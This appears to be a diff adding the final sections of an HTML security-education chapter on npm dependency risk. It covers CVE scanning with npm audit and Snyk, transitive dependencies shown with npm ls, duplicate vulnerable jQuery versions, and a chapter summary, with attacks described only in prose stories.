+      <p>CVE databases are public — available to everyone, defenders and attackers alike. Attackers use them as <em>reconnaissance tools</em>. A developer who never checks CVEs is essentially advertising their vulnerabilities to every attacker who looks.</p>
+    </div>
+
+    <h3>How Ahmed Uses CVE Databases to Defend</h3>
+    <div class="safe">
+      <div class="safe-title">Ahmed's Defensive Process</div>
+      <ul>
+        <li>Run <code>npm audit</code> in his project — it automatically checks all packages against the npm advisory database (which sources from NVD)</li>
+        <li>Use <strong>Snyk</strong> (<code>snyk test</code>) — a tool that continuously monitors dependencies and alerts Ahmed when a new CVE affects any package he uses</li>
+        <li>Subscribe to GitHub Dependabot — automatically opens pull requests to update vulnerable dependencies</li>
+        <li>Check NVD manually when evaluating any new package before adding it</li>
+      </ul>
+    </div>
+  </div>
+
+
+  <!-- ═══ SECTION 7 ═══ -->
+  <div class="section" id="s7">
+    <div class="section-num">SECTION 7</div>
+    <h2>The Recursive Dependency Problem</h2>
+
+    <p>This is one of the most important and surprising concepts in this chapter. When you install a package, you don't just get that package — <strong>you get every package it depends on, and every package those packages depend on, and so on.</strong></p>
+
+    <h3>Understanding the Dependency Tree</h3>
+    <p>Think of it like a family tree — but for code packages.</p>
+
+    <div class="flow">
+      <div class="flow-box">Your App</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box">express</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box">accepts</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box">mime-types</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-box red">mime-db ← Vulnerable!</div>
+    </div>
+
+    <p>In this example, Ahmed installs <code>express</code>. He never installs <code>mime-db</code> himself — he has never even heard of it. But it is running inside his application, four levels deep, because <code>express</code> → <code>accepts</code> → <code>mime-types</code> → <code>mime-db</code>.</p>
+
+    <div class="story">
+      <div class="story-title">Ahmed and Ali — The Hidden Dependency Attack</div>
+      <p>Ahmed's security team runs a manual review of his <code>package.json</code> and declares the application safe. They checked all 6 packages Ahmed directly installed.</p>
+      <p>What they didn't check: those 6 packages pulled in 847 additional transitive (indirect) dependencies. Ali finds a critical CVE in <code>qs@6.5.2</code> — a query string parsing library buried 3 levels deep under <code>express</code>. Ahmed's team never looked at it.</p>
+      <p>Ali crafts a URL with a specially constructed query string that exploits the vulnerability in <code>qs</code>, gaining remote code execution on Ahmed's server.</p>
+    </div>
+
+    <h3>How to See Your Full Dependency Tree</h3>
+    <pre><code><span class="comment"># Show all dependencies up to 3 levels deep</span>
+npm ls --depth=3
+
+<span class="comment"># Show all dependencies (can output thousands of lines)</span>
+npm ls --all
+
+<span class="comment"># Output:</span>
+my-app@1.0.0
+├── express@4.18.2
+│   ├── accepts@1.3.8
+│   │   ├── mime-types@2.1.35
+│   │   │   └── mime-db@1.52.0      <span class="comment">← you never installed this</span>
+│   │   └── negotiator@0.6.3
+│   ├── body-parser@1.20.1
+│   │   ├── qs@6.11.0               <span class="comment">← you never installed this either</span>
+│   │   └── ...
+...</code></pre>
+
+    <h3>The Same Package — Two Versions at Once</h3>
+    <p>Here is something even more surprising: your application might be running <strong>two different versions of the same package simultaneously</strong> — one patched, one vulnerable.</p>
+
+    <div class="attack">
+      <div class="attack-title">Ahmed's Confusing Situation</div>
+      <p>Ahmed runs <code>npm audit</code> and sees a warning: <em>"jquery 2.2.1 has a known XSS vulnerability."</em></p>
+      <p>Ahmed checks his <code>package.json</code>: he doesn't even list jQuery! He uses <code>jquery@3.4.0</code> (patched). How can the audit report jQuery 2.2.1?</p>
+      <p>The answer: two of Ahmed's sub-dependencies (<code>old-ui-lib</code> and <code>legacy-widget</code>) both depend on <code>jquery@2.2.1</code> specifically. npm installs both versions side-by-side — his app runs jQuery 3.4.0 (safe) AND jQuery 2.2.1 (vulnerable) at the same time.</p>
+      <p>Simply updating Ahmed's own jQuery does nothing — the vulnerable version is still running inside those sub-dependencies.</p>
+    </div>
+
+    <div class="safe">
+      <div class="safe-title">What Ahmed Must Do</div>
+      <p>Ahmed must either: (1) update <code>old-ui-lib</code> and <code>legacy-widget</code> to versions that use the patched jQuery, (2) fork those packages and manually update their jQuery dependency, or (3) remove those packages entirely and find alternatives. This is why dependency management is a continuous process, not a one-time task.</p>
+    </div>
+  </div>
+
+
+  <!-- ═══ SECTION 8 ═══ -->
+  <div class="section" id="s8">
+    <div class="section-num">SECTION 8</div>
+    <h2>Chapter Summary &amp; Key Points</h2>
+
+    <div class="summary">
+      <h2>Everything You Need to Remember</h2>
+      <ul>
+        <li><strong>Third-party dependencies are a major attack surface</strong> — your app is only as secure as its weakest dependency.</li>
+        <li><strong>Four integration methods, four different risks:</strong> Git forks (unreviewed pulls), self-hosted installers (admin-level backdoors), copy-paste source (no upstream patches), package managers (cascading automatic compromise).</li>
+        <li><strong>Package manager attacks are the most dangerous at scale</strong> — one compromised npm package can affect millions of applications simultaneously, often silently through automatic updates.</li>
+        <li><strong>Three real npm attacks prove this is not theoretical:</strong> left-pad (availability), eslint-scope (credential theft cascade), event-stream (targeted Bitcoin theft — undetected for 2 months).</li>
+        <li><strong>CVE databases (NVD and Mitre)</strong> are used by both attackers (for reconnaissance) and defenders (for scanning). Ignoring CVEs = advertising your vulnerabilities.</li>
+        <li><strong>Transitive dependencies are hidden risk</strong> — a vulnerability 4 levels deep in your dependency tree is just as dangerous as one in your own code.</li>
+        <li><strong>The same package can run in two versions simultaneously</strong> — one patched, one vulnerable. Updating your own listing does not fix sub-dependency versions.</li>
+        <li><strong>Defense tools:</strong> <code>npm audit</code>, <code>snyk test</code>, <code>npm shrinkwrap</code>, removing the <code>^</code> caret, private npm mirrors.</li>
+      </ul>
+    </div>
+
+    <div class="takeaway">
+      <h3>The One Sentence That Explains It All</h3>
+      <p style="font-size:18px; color:#e8eaf6; line-height:1.6;">
+        When you run <code style="background:#263238; color:#90caf9;">npm install</code>, you are not just installing the packages you asked for — you are trusting hundreds of developers you have never met, whose accounts could be hacked, whose code you have never read, and whose security practices you cannot verify.
+      </p>
+    </div>
+  </div>
+
+</div><!-- /page -->
+
+</body>
+</html>
